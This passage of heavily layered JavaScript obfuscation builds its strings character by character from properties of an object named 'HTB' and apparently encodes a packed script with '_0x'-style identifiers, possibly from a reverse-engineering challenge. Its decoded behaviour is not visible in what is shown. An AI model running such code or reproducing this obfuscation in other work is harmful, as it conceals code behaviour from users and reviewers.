+HTB._$$+HTB._$$+":"+HTB.__$+HTB.$$_+HTB.__$+"}))}',"+HTB.__$+HTB.___+","+HTB.$_$+HTB.$_$+HTB.$__+",'||||||\\"+HTB.__$+HTB.$$_+HTB.$$_+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB._$_+"|"+HTB.$$$$+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$__+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"|\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+HTB.__+HTB._+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB._$$+HTB._$_+HTB.__$+HTB.$$__+HTB.$___+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.___+HTB.$$$$+HTB.$$_+HTB.___+HTB.$_$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$_$+HTB.$__+HTB.$__$+HTB._$_+HTB.$_$_+"|"+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+HTB._$_+HTB.$$__+HTB.$$$_+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+HTB._$$+HTB.$_$_+HTB.$_$_+HTB.$$_$+HTB.__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$_+HTB.$_$+HTB.$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$$$+HTB.$$_+HTB._$_+HTB.$$$+HTB.$$_+"|\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.___+"|\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.__$+HTB._$_+HTB._$_+HTB.$$$_+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.___+HTB.$$__+HTB.$$$+HTB.$$_$+HTB._$_+"|"+(![]+"")[HTB._$_]+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.___+"|"+HTB.$$$$+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+HTB._$$+HTB.$$$+HTB.$_$+HTB.__$+"|"+HTB.$$__+"\\"+HTB.__$+HTB._$$+HTB.__$+"\\"+HTB.__$+HTB._$$+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB.$$$_+HTB.$$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$$_+HTB.$__$+HTB.$$__+HTB.$$$_+HTB.___+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__$+HTB.__$+HTB.$$$$+HTB.$__$+HTB.$$__+HTB.$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+"|"+HTB.$$__+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB._+HTB.$$$_+"|"+HTB.$$__+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$$_+HTB.$_$_+HTB.$_$$+HTB.___+HTB.$$__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$__+HTB._$_+HTB.$$$_+HTB.$$__+HTB.$___+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$$_$+HTB.$___+HTB.$__$+HTB.$$_$+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$__+HTB.$$__+HTB.$__+HTB.$$_+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__+HTB.$_$_+HTB.$_$+HTB.$$_$+HTB.$__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$$+HTB.$_$$+HTB.$$$+HTB.$___+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$_+HTB.$$_$+HTB._$$+HTB.$$_+HTB.$_$+"|\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$$+HTB.$$$+HTB.$$__+HTB.$_$_+HTB.$_$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$_+HTB.$$_$+HTB.$$$_+HTB.$$__+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$+HTB.$$$$+HTB.$$$+HTB.$$$$+HTB.$$$$+"|\\"+HTB.__$+HTB.$$_+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB._$$+HTB._$_+"|\\"+HTB.__$+HTB.$$_+HTB.$$_+HTB.$_$_+(![]+"")[HTB._$_]+HTB._+HTB.$$$_+"|\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB._+(![]+"")[HTB._$_]+(![]+"")[HTB._$_]+"|"+HTB.$$_$+HTB._$+HTB.$$__+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.__+"|"+HTB.$$$_+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_+HTB.$_$$+HTB.___+HTB.$_$+HTB.$_$$+HTB.$$_$+"|\\"+HTB.__$+HTB.$__+HTB.$$$+HTB.$$$_+HTB.__+"\\"+HTB.__$+HTB.___+HTB.$_$+(![]+"")[HTB._$_]+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.__+"\\"+HTB.__$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB.__$+HTB.$$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$$+HTB.$$__+HTB.$_$+HTB._$_+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+HTB.$_$$+HTB.__$+HTB._$$+HTB.$$__+"|\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$$__+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"|\\"+HTB.__$+HTB._$$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB.$__+"|"+HTB._+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+HTB.$__$+HTB.$__$+HTB.$_$$+HTB.$_$$+HTB.$__+"|"+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$_$+HTB.$$$_+HTB.$$$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$$_+HTB.$$_$+"|\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+"|"+HTB._$$+"\\"+HTB.__$+HTB._$$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB.___+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$__$+HTB.___+HTB.$_$$+HTB.$$$$+HTB.$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$__+HTB.$__$+HTB.$__+HTB.$$$_+HTB.___+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$__$+HTB.$_$$+HTB.$$_$+HTB.__$+HTB.$__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$_+HTB.$_$$+HTB.$_$$+HTB.$$__+HTB.$__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$$_+HTB.$_$_+HTB.__$+HTB.___+HTB.$$_$+"|"+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.__+"\\"+HTB.__$+HTB.$$_+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$_+HTB.$__$+HTB.$___+HTB.$$$+HTB.$$__+"|\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"|"+HTB.__+HTB._$+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB.__+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$__$+HTB.$$$$+HTB.$__$+HTB.$$$+HTB.$__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$__+HTB._$$+HTB.$$__+HTB.$$__+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$_$_+HTB.$$_+HTB.$$_+HTB.$$__+HTB.___+"|\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$$__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$___+HTB.$$_$+HTB.$___+HTB.$$__+HTB.$___+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.__$+HTB._$$+HTB.$$__+HTB.$_$+HTB.$_$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__$+HTB.$_$_+HTB.$$__+HTB.$$$$+HTB.$__$+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$$$+HTB.$$$+HTB.$__+HTB.$___+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$_$$+HTB.$$_$+HTB.$$$_+HTB.$$_$+HTB.__$+"|\\"+HTB.__$+HTB.$$_+HTB.__$+HTB.$$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$__$+HTB.$___+HTB.$$__+HTB.$$_+HTB.$___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$$+HTB.___+HTB.$$_$+HTB.$__+HTB.$___+"|\\"+HTB.__$+HTB.$$_+HTB._$_+"|"+HTB.$$__+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+HTB.$$_$+HTB.$$$_+"\\"+HTB.__$+HTB.___+HTB.__$+HTB.__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.___+HTB.$$$_+HTB.$__$+HTB.$_$$+HTB.$__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$$+HTB.$$_$+HTB.$$_$+HTB.$$$_+HTB.$$_$+"|\\"+HTB.__$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB.$$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$__+HTB.$__$+HTB.$___+HTB.$_$$+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$$$+HTB.$$_+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$_+HTB._$_+HTB.$$$$+HTB._$_+HTB.$_$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$$+HTB.___+HTB.$_$_+HTB.$$$_+HTB.$__$+"|\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB.$$_+HTB.$$$_+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.___+HTB.$$__+HTB.$$_+HTB.$$_+HTB.$_$+"|"+HTB.$$__+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.__+"\\"+HTB.__$+HTB.$$_+HTB._$_+HTB._+HTB.$$__+HTB.__+HTB._$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$_+HTB.$__+HTB.__$+HTB.$$$$+HTB.$$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$$$+HTB.$$$$+HTB.$$$$+HTB.$__$+HTB._$$+"|\\"+HTB.__$+HTB._$_+HTB._$$+HTB.__+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$$+HTB.$___+HTB._$$+HTB.___+HTB.$$_$+"|\\"+HTB.__$+HTB._$_+HTB._$_+HTB.$$$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB.$$$+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.___+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__$+HTB.$___+HTB._$$+HTB._$_+HTB._$_+HTB.$__+"|"+HTB.$$$+HTB.$$$+HTB.$__+HTB.$$$+HTB.$$$_+HTB.$$$_+HTB.$$$_+HTB.$$$_+HTB._$_+HTB.$$$$+HTB._$_+HTB.$$_$+HTB.$$__+HTB.__$+HTB.$$_+HTB._$_+HTB.$$__+HTB.$$__+HTB.$___+HTB.$_$+HTB._$$+HTB.$_$_+HTB.$___+HTB._$$+HTB.$$$+HTB.__$+HTB._$$+HTB.$__$+HTB.$_$+HTB.$$_$+HTB.$$_$+HTB.$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$_+HTB.$__$+HTB._$$+HTB.$$$_+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$___+HTB.__$+HTB.$$$+HTB.$__$+HTB.$_$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$_$+"|\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB._$_+HTB._$+HTB.__+HTB._$+HTB.__+"\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$$_+"|\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.$__+HTB.$__+"\\"+HTB.__$+HTB._$$+HTB.__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB._$_+HTB.$$_+HTB.$$__+HTB.$__$+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$_$+HTB.$$_+HTB.$_$+HTB._$_+HTB.$$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$_+HTB.$$$+HTB.$_$+HTB.$$$$+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$+HTB._$$+HTB.$$$_+HTB._$$+HTB.$$_$+"|\\"+HTB.__$+HTB.$$_+HTB.___+HTB._+"\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.___+"|"+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.__$+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$_$+HTB.$$$_+HTB.$$$_+HTB.$$__+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$___+HTB.$_$$+HTB.$_$+HTB.$$$_+HTB.$$$$+"|\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.$$_+HTB.__$+"\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB.___+HTB.$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$_$+HTB.$$_$+HTB.$$$$+HTB.$$_+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.___+HTB.___+HTB.$$_$+HTB.$_$$+HTB.$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.__$+HTB._$_+HTB.$__+HTB.$_$+HTB.___+"|\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.$_$+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.__$+HTB._$_+"|\\"+HTB.__$+HTB.__$+HTB.$_$+HTB.$_$_+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.___+"|\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.___+HTB.$__+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.__$+HTB.$_$_+HTB.$___+HTB.$_$_+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$___+HTB.$$_$+HTB.___+HTB.$_$_+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+"|"+HTB.$$$_+"\\"+HTB.__$+HTB.___+HTB.$$$+HTB.__+"\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.___+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB._$$+HTB._$_+HTB.$___+HTB._$_+HTB.$__+"|"+HTB.$_$$+"|\\"+HTB.__$+HTB._$$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$$+"|\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$$_+"\\"+HTB.__$+HTB.$$$+HTB._$_+"|"+HTB.__+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__$+HTB.___+HTB.$_$+HTB.$__+HTB.$$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$__+HTB._$_+HTB._$$+HTB.$___+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.___+HTB.$_$$+HTB.$$_+HTB.$$$$+HTB.$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.___+HTB.$___+HTB.$_$_+HTB._$$+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$$+HTB.__$+HTB.___+HTB.$$_$+HTB.$$$$+"|"+HTB._$+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+HTB._$_+HTB.$_$+HTB.$__+HTB.$___+HTB.$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.__$+HTB.$$$+HTB.$_$+HTB.$$__+HTB.__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.___+HTB.$$$+HTB.$__$+HTB.$_$_+HTB.$$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$_+HTB._$$+HTB.$$_$+HTB.$_$+HTB.$__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$__+HTB.$__$+HTB.__$+HTB.$_$_+HTB._$_+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.$$_+HTB.$$_+"\\"+HTB.__$+HTB._$$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"|\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.$$$+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB.__$+HTB._+"\\"+HTB.__$+HTB._$_+HTB.$_$+"|"+HTB._$+"\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$__+"\\"+HTB.__$+HTB._$$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$+HTB.$__$+HTB.__$+HTB.$$_$+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB._$$+HTB.$_$$+HTB.$$__+HTB.$$$_+HTB.$__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$___+HTB.$$__+HTB.$__+HTB.$__$+HTB.___+"|\\"+HTB.__$+HTB.__$+HTB.__$+"\\"+HTB.__$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB.___+HTB.$$$+HTB._+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$$$+HTB.$___+HTB.$$_$+HTB.$__$+HTB.__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$_+HTB.$$_+HTB.$$_+HTB.$__$+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$_+HTB.$__$+HTB.$_$+HTB.$$$$+HTB.$_$+HTB.$__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$+HTB.__$+HTB._$_+HTB.$_$_+HTB.$__+"|"+HTB.$$__+HTB._$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$_+HTB.$_$+HTB.$_$+HTB.$_$_+HTB.$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.__$+HTB._$$+HTB._$$+HTB.$$$_+HTB.$$__+"|"+HTB.$$__+HTB.$$$+HTB.___+HTB.$$$$+HTB._$_+HTB.$$_$+HTB.$$$_+HTB.__$+HTB.$_$+HTB._$_+HTB.__$+HTB.$$_+HTB.$$__+HTB.$__$+HTB.$__+HTB.__$+HTB.$$__+HTB._$$+HTB.$$_+HTB.$_$_+HTB.$$_+HTB.$_$_+HTB._$$+HTB.$$$+HTB.$$$+HTB.$_$_+HTB.$$$+HTB.$___+HTB.$$$$+HTB._$_+HTB.$__+HTB.$$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$_$$+HTB.$__+HTB.__$+HTB.$$$_+HTB.$__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$_$$+HTB.$$$+HTB.$$_$+HTB.$$$_+HTB.__$+"|\\"+HTB.__$+HTB.___+HTB.$__+"\\"+HTB.__$+HTB.$$_+HTB.$$_+"\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.$$_+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$$+HTB.$$__+HTB._$_+HTB.$_$$+HTB.$__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$___+HTB._$$+HTB.$_$$+HTB.$$_$+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.___+HTB.$_$+HTB.$_$+HTB.__$+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB._$$+HTB.$$__+HTB.$$_$+HTB.$_$+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$_$$+HTB.$$__+HTB.$$$$+HTB.$$$$+HTB.$_$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.__$+HTB._$$+HTB.$$_$+HTB.$___+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.__$+"|\\"+HTB.__$+HTB.___+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$_+HTB.___+HTB.$_$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$__+"|\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB.$_